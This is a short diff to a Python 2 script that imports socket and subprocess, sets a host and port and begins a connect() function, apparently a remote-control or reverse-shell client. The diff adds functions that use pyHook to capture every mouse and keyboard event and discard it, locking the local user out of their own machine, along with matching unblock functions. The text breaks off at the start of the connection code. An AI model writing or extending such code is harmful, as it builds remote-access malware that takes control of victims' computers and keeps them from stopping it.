@@ -1,5 +1,7 @@
 #! /usr/bin/env python
 
+import pythoncom
+import pyHook
 import socket
 import subprocess
 import sys
@@ -7,6 +9,29 @@ import time
 
 HOST = '127.0.0.1'   
 PORT = 22
+
+def setBlock(event):    
+    return False    
+    
+def setUnblock(event):    
+    return True    
+    
+def blockInput():    
+    hookManager = pyHook.HookManager()    
+    hookManager.MouseAll = setBlock    
+    hookManager.KeyAll = setBlock    
+    hookManager.HookMouse()    
+    hookManager.HookKeyboard()    
+    pythoncom.PumpMessages()    
+    
+def unblockInput():    
+    hookManager = pyHook.HookManager()    
+    hookManager.MouseAll = setUnblock    
+    hookManager.KeyAll = setUnblock    
+    hookManager.HookMouse()    
+    hookManager.HookKeyboard()    
+    pythoncom.PumpMessages()  
+
 
 def connect((host, port)):
 	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
